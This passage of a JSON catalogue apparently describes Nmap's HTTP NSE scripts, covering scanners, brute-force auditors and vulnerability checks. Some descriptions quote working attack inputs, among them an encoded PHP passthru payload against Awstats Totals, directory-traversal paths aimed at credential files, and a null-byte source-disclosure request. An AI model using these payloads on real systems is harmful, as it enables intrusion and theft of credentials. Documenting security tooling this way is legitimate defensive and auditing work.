    "description": "Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14\nand possibly other products based on it (CVE: 2008-3922).\n\nThis vulnerability can be exploited through the GET variable <code>sort</code>.\nThe script queries the web server with the command payload encoded using PHP's\nchr() function:\n\n<code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>\n\nCommon paths for Awstats Total:\n* <code>/awstats/index.php</code>\n* <code>/awstatstotals/index.php</code>\n* <code>/awstats/awstatstotals.php</code>\n\nReferences:\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922\n* http://www.exploit-db.com/exploits/17324/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-axis2-dir-traversal.nse",
    "description": "Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by\nsending a specially crafted request to the parameter <code>xsd</code>\n(BID 40343). By default it will try to retrieve the configuration file of the\nAxis2 service <code>'/conf/axis2.xml'</code> using the path\n<code>'/axis2/services/'</code> to return the username and password of the\nadmin account.\n\nTo exploit this vulnerability we need to detect a valid service running on the\ninstallation so we extract it from <code>/listServices</code> before exploiting\nthe directory traversal vulnerability.  By default it will retrieve the\nconfiguration file, if you wish to retrieve other files you need to set the\nargument <code>http-axis2-dir-traversal.file</code> correctly to traverse to\nthe file's directory. Ex. <code>../../../../../../../../../etc/issue</code>\n\nTo check the version of an Apache Axis2 installation go to:\nhttp://domain/axis2/services/Version/getVersion\n\nReference:\n* https://www.securityfocus.com/bid/40343\n* https://www.exploit-db.com/exploits/12721/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-backup-finder.nse",
    "description": "Spiders a website and attempts to identify backup copies of discovered files.\nIt does so by requesting a number of different combinations of the filename (eg. index.bak, index.html~, copy of index.html).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-barracuda-dir-traversal.nse",
    "description": "Attempts to retrieve the configuration settings from a Barracuda\nNetworks Spam & Virus Firewall device using the directory traversal\nvulnerability described at\nhttp://seclists.org/fulldisclosure/2010/Oct/119.\n\nThis vulnerability is in the \"locale\" parameter of\n\"/cgi-mod/view_help.cgi\" or \"/cgi-bin/view_help.cgi\", allowing the\ninformation to be retrieved from a MySQL database dump.  The web\nadministration interface runs on port 8000 by default.\n\nBarracuda Networks Spam & Virus Firewall <= 4.1.1.021 Remote Configuration Retrieval\nOriginal exploit by ShadowHatesYou <Shadow@SquatThis.net>\nFor more information, see:\nhttp://seclists.org/fulldisclosure/2010/Oct/119\nhttp://www.exploit-db.com/exploits/15130/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-bigip-cookie.nse",
    "description": "Decodes any unencrypted F5 BIG-IP cookies in the HTTP response.\nBIG-IP cookies contain information on backend systems such as\ninternal IP addresses and port numbers.\nSee here for more info: https://support.f5.com/csp/article/K6917",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-brute.nse",
    "description": "Performs brute force password auditing against http basic, digest and ntlm authentication.\n\nThis script uses the unpwdb and brute libraries to perform password\nguessing. Any successful guesses are stored in the nmap registry, using\nthe creds library, for other scripts to use.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-cakephp-version.nse",
    "description": "Obtains the CakePHP version of a web application built with the CakePHP\nframework by fingerprinting default files shipped with the CakePHP framework.\n\nThis script queries the files 'vendors.php', 'cake.generic.css',\n'cake.icon.png' and 'cake.icon.gif' to try to obtain the version of the CakePHP\ninstallation.\n\nSince installations that had been upgraded are prone to false positives due to\nold files that aren't removed, the script displays 3 different versions:\n* Codebase: Taken from the existence of vendors.php (1.1.x or 1.2.x if it does and 1.3.x otherwise)\n* Stylesheet: Taken from cake.generic.css\n* Icon: Taken from cake.icon.gif or cake.icon.png\n\nFor more information about CakePHP visit: http://www.cakephp.org/.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-chrono.nse",
    "description": "Measures the time a website takes to deliver a web page and returns\nthe maximum, minimum and average time it took to fetch a page.\n\nWeb pages that take longer time to load could be abused by attackers in DoS or\nDDoS attacks due to the fact that they are likely to consume more resources on\nthe target server. This script could help identifying these web pages.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-cisco-anyconnect.nse",
    "description": "Connect as Cisco AnyConnect client to a Cisco SSL VPN and retrieves version\nand tunnel information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-coldfusion-subzero.nse",
    "description": "Attempts to retrieve version, absolute path of administration panel and the\nfile 'password.properties' from vulnerable installations of ColdFusion 9 and\n10.\n\nThis was based on the exploit 'ColdSub-Zero.pyFusion v2'.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-comments-displayer.nse",
    "description": "Extracts and outputs HTML and JavaScript comments from HTTP responses.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-config-backup.nse",
    "description": "Checks for backups and swap files of common content management system\nand web server configuration files.\n\nWhen web server files are edited in place, the text editor can leave\nbackup or swap files in a place where the web server can serve them. The\nscript checks for these files:\n\n* <code>wp-config.php</code>: WordPress\n* <code>config.php</code>: phpBB, ExpressionEngine\n* <code>configuration.php</code>: Joomla\n* <code>LocalSettings.php</code>: MediaWiki\n* <code>/mediawiki/LocalSettings.php</code>: MediaWiki\n* <code>mt-config.cgi</code>: Movable Type\n* <code>mt-static/mt-config.cgi</code>: Movable Type\n* <code>settings.php</code>: Drupal\n* <code>.htaccess</code>: Apache\n\nAnd for each of these file applies the following transformations (using\n<code>config.php</code> as an example):\n\n* <code>config.bak</code>: Generic backup.\n* <code>config.php.bak</code>: Generic backup.\n* <code>config.php~</code>: Vim, Gedit.\n* <code>#config.php#</code>: Emacs.\n* <code>config copy.php</code>: Mac OS copy.\n* <code>Copy of config.php</code>: Windows copy.\n* <code>config.php.save</code>: GNU Nano.\n* <code>.config.php.swp</code>: Vim swap.\n* <code>config.php.swp</code>: Vim swap.\n* <code>config.php.old</code>: Generic backup.\n\nThis script is inspired by the CMSploit program by Feross Aboukhadijeh:\nhttp://www.feross.org/cmsploit/.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-cookie-flags.nse",
    "description": "Examines cookies set by HTTP services.  Reports any session cookies set\nwithout the httponly flag.  Reports any session cookies set over SSL without\nthe secure flag.  If http-enum.nse is also run, any interesting paths found\nby it will be checked in addition to the root.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-cors.nse",
    "description": "Tests an http server for Cross-Origin Resource Sharing (CORS), a way\nfor domains to explicitly opt in to having certain methods invoked by\nanother domain.\n\nThe script works by setting the Access-Control-Request-Method header\nfield for certain enumerated methods in OPTIONS requests, and checking\nthe responses.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-cross-domain-policy.nse",
    "description": "Checks the cross-domain policy file (/crossdomain.xml) and the client-acces-policy file (/clientaccesspolicy.xml)\nin web applications and lists the trusted domains. Overly permissive settings enable Cross Site Request Forgery\nattacks and may allow attackers to access sensitive data. This script is useful to detect permissive\nconfigurations and possible domain names available for purchase to exploit the application.\n\nThe script queries instantdomainsearch.com to lookup the domains. This functionality is\nturned off by default, to enable it set the script argument http-cross-domain-policy.domain-lookup.\n\nReferences:\n* http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html\n* http://gursevkalra.blogspot.com/2013/08/bypassing-same-origin-policy-with-flash.html\n* https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html\n* https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf\n* https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_%28OTG-CONFIG-008%29\n* http://acunetix.com/vulnerabilities/web/insecure-clientaccesspolicy-xml-file",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-csrf.nse",
    "description": "This script detects Cross Site Request Forgeries (CSRF) vulnerabilities.\n\nIt will try to detect them by checking each form if it contains an unpredictable\ntoken for each user. Without one an attacker may forge malicious requests.\n\nTo recognize a token in a form, the script will iterate through the form's\nattributes and will search for common patterns in their names. If that fails, it\nwill also calculate the entropy of each attribute's value. A big entropy means a\npossible token.\n\nA common use case for this script comes along with a cookie that gives access\nin pages that require authentication, because that's where the privileged\nexist. See the http library's documentation to set your own cookie.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-date.nse",
    "description": "Gets the date from HTTP-like services. Also prints how much the date\ndiffers from local time. Local time is the time the HTTP request was\nsent, so the difference includes at least the duration of one RTT.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-default-accounts.nse",
    "description": "Tests for access with default credentials used by a variety of web applications and devices.\n\nIt works similar to http-enum, we detect applications by matching known paths and launching a login routine using default credentials when found.\nThis script depends on a fingerprint file containing the target's information: name, category, location paths, default credentials and login routine.\n\nYou may select a category if you wish to reduce the number of requests. We have categories like:\n* <code>web</code> - Web applications\n* <code>routers</code> - Routers\n* <code>security</code> - CCTVs and other security devices\n* <code>industrial</code> - Industrial systems\n* <code>printer</code> - Network-attached printers and printer servers\n* <code>storage</code> - Storage devices\n* <code>virtualization</code> - Virtualization systems\n* <code>console</code> - Remote consoles\n\nYou can also select a specific fingerprint or a brand, such as BIG-IQ or Siemens. This matching is based on case-insensitive words. This means that \"nas\" will select Seagate BlackArmor NAS storage but not Netgear ReadyNAS.\n\nFor a fingerprint to be used it needs to satisfy both the category and name criteria.\n\nBy default, the script produces output only when default credentials are found, while staying silent when the target only matches some fingerprints (but no credentials are found). With increased verbosity (option -v), the script will also report all matching fingerprints.\n\nPlease help improve this script by adding new entries to nselib/data/http-default-accounts.lua\n\nRemember each fingerprint must have:\n* <code>name</code> - Descriptive name\n* <code>category</code> - Category\n* <code>login_combos</code> - Table of login combinations\n* <code>paths</code> - Table containing possible path locations of the target\n* <code>login_check</code> - Login function of the target\n\nIn addition, a fingerprint should have:\n* <code>target_check</code> - Target validation function. If defined, it will be called to validate the target before attempting any logins.\n* <code>cpe</code> - Official CPE Dictionary entry (see https://nvd.nist.gov/cpe.cfm)\n\nDefault fingerprint file: /nselib/data/http-default-accounts-fingerprints.lua\nThis script was based on http-enum.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-devframework.nse",
    "description": "Tries to find out the technology behind the target website.\n\nThe script checks for certain defaults that might not have been changed, like\ncommon headers or URLs or HTML content.\n\nWhile the script does some guessing, note that overall there's no way to\ndetermine what technologies a given site is using.\n\nYou can help improve this script by adding new entries to\nnselib/data/http-devframework-fingerprints.lua\n\nEach entry must have:\n* <code>rapidDetect</code> - Callback function that is called in the beginning\nof detection process. It takes the host and port of target website as arguments.\n* <code>consumingDetect</code> - Callback function that is called for each\nspidered page. It takes the body of the response (HTML code) and the requested\npath as arguments.\n\nNote that the <code>consumingDetect</code> callback will not take place only if\n<code>rapid</code> option is enabled.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-dlink-backdoor.nse",
    "description": "Detects a firmware backdoor on some D-Link routers by changing the User-Agent\nto a \"secret\" value. Using the \"secret\" User-Agent bypasses authentication\nand allows admin access to the router.\n\nThe following router models are likely to be vulnerable: DIR-100, DIR-120,\nDI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+, TM-G5240\n\nIn addition, several Planex routers also appear to use the same firmware:\nBRL-04UR, BRL-04CW\n\nReference: http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-dombased-xss.nse",
    "description": "It looks for places where attacker-controlled information in the DOM may be used\nto affect JavaScript execution in certain ways. The attack is explained here:\nhttp://www.webappsec.org/projects/articles/071105.shtml",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-domino-enum-passwords.nse",
    "description": "Attempts to enumerate the hashed Domino Internet Passwords that are (by\ndefault) accessible by all authenticated users. This script can also download\nany Domino ID Files attached to the Person document.  Passwords are presented\nin a form suitable for running in John the Ripper.\n\nThe passwords may be stored in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):\n\n1. Saltless (legacy support?)\n   Example: 355E98E7C7B59BD810ED845AD0FD2FC4\n   John's format name: lotus5\n2. Salted (also known as \"More Secure Internet Password\")\n   Example: (GKjXibCW2Ml6juyQHUoP)\n   John's format name: dominosec\n\nIt appears as if form based authentication is enabled, basic authentication\nstill works. Therefore the script should work in both scenarios. Valid\ncredentials can either be supplied directly using the parameters username\nand password or indirectly from results of http-brute or http-form-brute.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-drupal-enum-users.nse",
    "description": "Enumerates Drupal users by exploiting an information disclosure vulnerability\nin Views, Drupal's most popular module.\n\nRequests to admin/views/ajax/autocomplete/user/STRING return all usernames that\nbegin with STRING. The script works by iterating STRING over letters to extract\nall usernames.\n\nFor more information,see:\n* http://www.madirish.net/node/465",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-drupal-enum.nse",
    "description": "Enumerates the installed Drupal modules/themes by using a list of known modules and themes.\n\nThe script works by iterating over module/theme names and requesting\nMODULE_PATH/MODULE_NAME/LICENSE.txt for modules and THEME_PATH/THEME_NAME/LICENSE.txt.\nMODULE_PATH/THEME_PATH which is either provided by the user, grepped for in the html body\nor defaulting to sites/all/modules/.\n\nIf the response status code is 200, it means that the module/theme is installed. By\ndefault, the script checks for the top 100 modules/themes (by downloads), given the\nhuge number of existing modules (~18k) and themes(~1.4k).\n\nIf you want to update your themes or module list refer to the link below.\n\n* https://svn.nmap.org/nmap-exp/gyani/misc/drupal-update.py",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-enum.nse",
    "description": "Enumerates directories used by popular web applications and servers.\n\nThis parses a fingerprint file that's similar in format to the Nikto Web application\nscanner. This script, however, takes it one step further by building in advanced pattern matching as well\nas having the ability to identify specific versions of Web applications.\n\nYou can also parse a Nikto-formatted database using http-fingerprints.nikto-db-path. This will try to parse\nmost of the fingerprints defined in nikto's database in real time. More documentation about this in the\nnselib/data/http-fingerprints.lua file.\n\nCurrently, the database can be found under Nmap's directory in the nselib/data folder. The file is called\nhttp-fingerprints and has a long description of its functionality in the file header.\n\nMany of the finger prints were discovered by me (Ron Bowes), and a number of them are from the Yokoso\nproject, used with permission from Kevin Johnson (http://seclists.org/nmap-dev/2009/q3/0685.html).\n\nInitially, this script attempts to access two different random files in order to detect servers\nthat don't return a proper 404 Not Found status. In the event that they return 200 OK, the body\nhas any non-static-looking data removed (URI, time, etc), and saved. If the two random attempts\nreturn different results, the script aborts (since a 200-looking 404 cannot be distinguished from\nan actual 200). This will prevent most false positives.\n\nIn addition, if the root folder returns a 301 Moved Permanently or 401 Authentication Required,\nthis script will also abort. If the root folder has disappeared or requires authentication, there\nis little hope of finding anything inside it.\n\nBy default, only pages that return 200 OK or 401 Authentication Required are displayed. If the\n<code>http-enum.displayall</code> script argument is set, however, then all results will be displayed (except\nfor 404 Not Found and the status code returned by the random files). Entries in the http-fingerprints\ndatabase can specify their own criteria for accepting a page as valid.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-errors.nse",
    "description": "This script crawls through the website and returns any error pages.\n\nThe script will return all pages (sorted by error code) that respond with an\nhttp code equal or above 400. To change this behaviour, please use the\n<code>errcodes</code> option.\n\nThe script, by default, spiders and searches within forty pages. For large web\napplications make sure to increase httpspider's <code>maxpagecount</code> value.\nPlease, note that the script will become more intrusive though.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-exif-spider.nse",
    "description": "Spiders a site's images looking for interesting exif data embedded in\n.jpg files. Displays the make and model of the camera, the date the photo was\ntaken, and the embedded geotag information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-favicon.nse",
    "description": "Gets the favicon (\"favorites icon\") from a web page and matches it against a\ndatabase of the icons of known web applications. If there is a match, the name\nof the application is printed; otherwise the MD5 hash of the icon data is\nprinted.\n\nIf the script argument <code>favicon.uri</code> is given, that relative URI is\nalways used to find the favicon. Otherwise, first the page at the root of the\nweb server is retrieved and parsed for a <code><link rel=\"icon\"></code>\nelement. If that fails, the icon is looked for in <code>/favicon.ico</code>. If\na <code><link></code> favicon points to a different host or port, it is ignored.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-feed.nse",
    "description": "This script crawls through the website to find any rss or atom feeds.\n\nThe script, by default, spiders and searches within forty pages. For large web\napplications make sure to increase httpspider's <code>maxpagecount</code> value.\nPlease, note that the script will become more intrusive though.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-fetch.nse",
    "description": "The script is used to fetch files from servers.\n\nThe script supports three different use cases:\n* The paths argument isn't provided, the script spiders the host\n  and downloads files in their respective folders relative to\n  the one provided using \"destination\".\n* The paths argument(a single item or list) is provided and the path starts\n  with \"/\", the script tries to fetch the path relative to the url\n  provided via the argument \"url\".\n* The paths argument(a single item or list) is provided and the path doesn't\n  start with \"/\". Then the script spiders the host and tries to find\n  files which contain the path(now treated as a pattern).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-fileupload-exploiter.nse",
    "description": "Exploits insecure file upload forms in web applications\nusing various techniques like changing the Content-type\nheader or creating valid image files containing the\npayload in the comment.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-form-brute.nse",
    "description": "Performs brute force password auditing against http form-based authentication.\n\nThis script uses the unpwdb and brute libraries to perform password\nguessing. Any successful guesses are stored in the nmap registry, using\nthe creds library, for other scripts to use.\n\nThe script automatically attempts to discover the form method, action, and\nfield names to use in order to perform password guessing. (Use argument\npath to specify the page where the form resides.) If it fails doing so\nthe form components can be supplied using arguments method, path, uservar,\nand passvar. The same arguments can be used to selectively override\nthe detection outcome.\n\nThe script contains a small database of known web apps' form information. This\nimproves form detection and also allows for form mangling and custom success\ndetection functions. If the script arguments aren't expressive enough, users\nare encouraged to edit the database to fit.\n\nAfter attempting to authenticate using a HTTP GET or POST request the script\nanalyzes the response and attempts to determine whether authentication was\nsuccessful or not. The script analyzes this by checking the response using\nthe following rules:\n\n1. If the response was empty the authentication was successful.\n2. If the onsuccess argument was provided then the authentication either\n   succeeded or failed depending on whether the response body contained\n   the message/pattern passed in the onsuccess argument.\n3. If no onsuccess argument was passed, and if the onfailure argument\n   was provided then the authentication either succeeded or failed\n   depending on whether the response body does not contain\n   the message/pattern passed in the onfailure argument.\n4. If neither the onsuccess nor onfailure argument was passed and the\n   response contains a form field named the same as the submitted\n   password parameter then the authentication failed.\n5. Authentication was successful.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-form-fuzzer.nse",
    "description": "Performs a simple form fuzzing against forms found on websites.\nTries strings and numbers of increasing length and attempts to\ndetermine if the fuzzing was successful.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-frontpage-login.nse",
    "description": "Checks whether target machines are vulnerable to anonymous Frontpage login.\n\nOlder, default configurations of Frontpage extensions allow\nremote user to login anonymously which may lead to server compromise.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-generator.nse",
    "description": "Displays the contents of the \"generator\" meta tag of a web page (default: /)\nif there is one.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-git.nse",
    "description": "Checks for a Git repository found in a website's document root\n/.git/<something>) and retrieves as much repo information as\npossible, including language/framework, remotes, last commit\nmessage, and repository description.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-gitweb-projects-enum.nse",
    "description": "Retrieves a list of Git projects, owners and descriptions from a gitweb (web interface to the Git revision control system).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-google-malware.nse",
    "description": "Checks if hosts are on Google's blacklist of suspected malware and phishing\nservers. These lists are constantly updated and are part of Google's Safe\nBrowsing service.\n\nTo do this the script queries the Google's Safe Browsing service and you need\nto have your own API key to access Google's Safe Browsing Lookup services. Sign\nup for yours at http://code.google.com/apis/safebrowsing/key_signup.html\n\n* To learn more about Google's Safe Browsing:\nhttp://code.google.com/apis/safebrowsing/\n\n* To register and get your personal API key:\nhttp://code.google.com/apis/safebrowsing/key_signup.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-grep.nse",
    "description": "Spiders a website and attempts to match all pages and urls against a given\nstring. Matches are counted and grouped per url under which they were\ndiscovered.\n\nFeatures built in patterns like email, ip, ssn, discover, amex and more.\nThe script searches for email and ip by default.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-headers.nse",
    "description": "Performs a HEAD request for the root folder (\"/\") of a web server and displays the HTTP headers returned.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-hp-ilo-info.nse",
    "description": "Attempts to extract information from HP iLO boards including versions and addresses.\n\nHP iLO boards have an unauthenticated info disclosure at <ip>/xmldata?item=all.\nIt lists board informations such as server model, firmware version,\nMAC addresses, IP addresses, etc. This script uses the slaxml library\nto parse the iLO xml file and display the info.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-huawei-hg5xx-vuln.nse",
    "description": "Detects Huawei modems models HG530x, HG520x, HG510x (and possibly others...)\nvulnerable to a remote credential and information disclosure vulnerability. It\nalso extracts the PPPoE credentials and other interesting configuration values.\n\nAttackers can query the URIs \"/Listadeparametros.html\" and \"/wanfun.js\" to\nextract sensitive information including PPPoE credentials, firmware version,\nmodel, gateway, dns servers and active connections among other values.\n\nThis script exploits two vulnerabilities. One was discovered and reported by\nAdiaz from Comunidad Underground de Mexico (http://underground.org.mx) and it\nallows attackers to extract the pppoe password. The configuration disclosure\nvulnerability was discovered by Pedro Joaquin (http://hakim.ws).\n\nReferences:\n* http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure\n* http://routerpwn.com/#huawei",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-icloud-findmyiphone.nse",
    "description": "Retrieves the locations of all \"Find my iPhone\" enabled iOS devices by querying\nthe MobileMe web service (authentication required).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-icloud-sendmsg.nse",
    "description": "Sends a message to a iOS device through the Apple MobileMe web service. The\ndevice has to be registered with an Apple ID using the Find My Iphone\napplication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-iis-short-name-brute.nse",
    "description": "Attempts to brute force the 8.3 filenames (commonly known as short names) of files and directories in the root folder\nof vulnerable IIS servers. This script is an implementation of the PoC \"iis shortname scanner\".\n\nThe script uses ~,? and * to bruteforce the short name of files present in the IIS document root.\nShort names have a restriction of 6 character file name followed by a three character extension.\n\nNotes:\n* The script might have to be run twice (according to the original author).\n* Tested against IIS 6.0 and 5.1.\n\nReferences:\n* Research paper: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf\n* IIS Shortname Scanner PoC: https://github.com/irsdl/IIS-ShortName-Scanner",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-iis-webdav-vuln.nse",
    "description": "Checks for a vulnerability in IIS 5.1/6.0 that allows arbitrary users to access\nsecured WebDAV folders by searching for a password-protected folder and\nattempting to access it. This vulnerability was patched in Microsoft Security\nBulletin MS09-020, https://nmap.org/r/ms09-020.\n\nA list of well known folders (almost 900) is used by default. Each one is\nchecked, and if returns an authentication request (401), another attempt is\ntried with the malicious encoding. If that attempt returns a successful result\n(207), then the folder is marked as vulnerable.\n\nThis script is based on the Metasploit auxiliary module\nauxiliary/scanner/http/wmap_dir_webdav_unicode_bypass\n\nFor more information on this vulnerability and script, see:\n* http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html\n* http://seclists.org/fulldisclosure/2009/May/att-134/IIS_Advisory_pdf.bin\n* http://www.skullsecurity.org/blog/?p=271\n* http://www.kb.cert.org/vuls/id/787932\n* http://www.microsoft.com/technet/security/advisory/971492.mspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-internal-ip-disclosure.nse",
    "description": "Determines if the web server leaks its internal IP address when sending an HTTP/1.0 request without a Host header.\n\nSome misconfigured web servers leak their internal IP address in the response\nheaders when returning a redirect response. This is a known issue for some\nversions of Microsoft IIS, but affects other web servers as well.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-joomla-brute.nse",
    "description": "Performs brute force password auditing against Joomla web CMS installations.\n\nThis script initially reads the session cookie and parses the security token to perfom the brute force password auditing.\nIt uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are stored using the\ncredentials library.\n\nJoomla's default uri and form names:\n* Default uri:<code>/administrator/index.php</code>\n* Default uservar: <code>username</code>\n* Default passvar: <code>passwd</code>",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-jsonp-detection.nse",
    "description": "Attempts to discover JSONP endpoints in web servers. JSONP endpoints can be\nused to bypass Same-origin Policy restrictions in web browsers.\n\nThe script searches for callback functions in the response to detect JSONP\nendpoints. It also tries to determine callback function through URL(callback\nfunction may be fully or partially controllable from URL) and also tries to\nbruteforce the most common callback variables through the URL.\n\nReferences : https://securitycafe.ro/2017/01/18/practical-jsonp-injection/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-litespeed-sourcecode-download.nse",
    "description": "Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x\nbefore 4.0.15 to retrieve the target script's source code by sending a HTTP\nrequest with a null byte followed by a .txt file extension (CVE-2010-2333).\n\nIf the server is not vulnerable it returns an error 400. If index.php is not\nfound, you may try /phpinfo.php which is also shipped with LiteSpeed Web\nServer. The attack payload looks like this:\n* <code>/index.php\\00.txt</code>\n\nReferences:\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333\n* http://www.exploit-db.com/exploits/13850/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-ls.nse",
    "description": "Shows the content of an \"index\" Web page.\n\nTODO:\n  - add support for more page formats",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-majordomo2-dir-traversal.nse",
    "description": "Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).\n\nVulnerability originally discovered by Michael Brooks.\n\nFor more information about this vulnerability:\n* http://www.mj2.org/\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0049\n* http://www.exploit-db.com/exploits/16103/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-malware-host.nse",
    "description": "Looks for signature of known server compromises.\n\nCurrently, the only signature it looks for is the one discussed here:\nhttp://blog.unmaskparasites.com/2009/09/11/dynamic-dns-and-botnet-of-zombie-web-servers/.\nThis is done by requesting the page <code>/ts/in.cgi?open2</code> and\nlooking for an errant 302 (it attempts to detect servers that always\nreturn 302). Thanks to Denis from the above link for finding this\ntechnique!",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-mcmp.nse",
    "description": "Checks if the webserver allows mod_cluster management protocol (MCMP) methods.\n\nThe script sends a MCMP PING message to determine protocol support, then issues\nthe DUMP command to dump the current configuration seen by mod_cluster_manager.\n\nReferences:\n\n* https://developer.jboss.org/wiki/Mod-ClusterManagementProtocol",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-method-tamper.nse",
    "description": "Attempts to bypass password protected resources (HTTP 401 status) by performing HTTP verb tampering.\nIf an array of paths to check is not set, it will crawl the web server and perform the check against any\npassword protected resource that it finds.\n\nThe script determines if the protected URI is vulnerable by performing HTTP verb tampering and monitoring\n the status codes. First, it uses a HEAD request, then a POST request and finally a random generated string\n( This last one is useful when web servers treat unknown request methods as a GET request. This is the case\n for PHP servers ).\n\nIf the table <code>paths</code> is set, it will attempt to access the given URIs. Otherwise, a web crawler\nis initiated to try to find protected resources. Note that in a PHP environment with .htaccess files you need to specify a\npath to a file rather than a directory to find misconfigured .htaccess files.\n\nReferences:\n* http://www.imperva.com/resources/glossary/http_verb_tampering.html\n* https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29\n* http://www.mkit.com.ar/labs/htexploit/\n* http://capec.mitre.org/data/definitions/274.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-methods.nse",
    "description": "Finds out what options are supported by an HTTP server by sending an\nOPTIONS request. Lists potentially risky methods. It tests those methods\nnot mentioned in the OPTIONS headers individually and sees if they are\nimplemented. Any output other than 501/405 suggests that the method is\nif not in the range 400 to 600. If the response falls under that range then\nit is compared to the response from a randomly generated method.\n\nIn this script, \"potentially risky\" methods are anything except GET,\nHEAD, POST, and OPTIONS. If the script reports potentially risky\nmethods, they may not all be security risks, but you should check to\nmake sure. This page lists the dangers of some common methods:\n\nhttp://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29\n\nThe list of supported methods comes from the contents of the Allow and\nPublic header fields. In verbose mode, a list of all methods is printed,\nfollowed by the list of potentially risky methods. Without verbose mode,\nonly the potentially risky methods are shown.",
    "source": "External",
